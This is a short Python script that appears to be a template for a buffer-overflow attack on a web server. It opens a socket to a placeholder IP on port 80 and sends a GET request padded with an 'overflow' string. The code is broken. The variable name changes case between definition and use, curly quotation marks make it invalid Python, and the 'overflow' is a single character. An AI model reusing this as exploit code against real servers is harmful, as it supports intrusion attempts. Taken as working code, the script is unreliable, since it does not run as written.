import socket
import os
import sys

ip = "IP"
port = 80

Overflow = “A”

buffer="GET "
buffer+=overflow
buffer+=" HTTP/1.1\r\n"

expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
expl.connect((ip, port))
expl.send(buffer)
expl.close()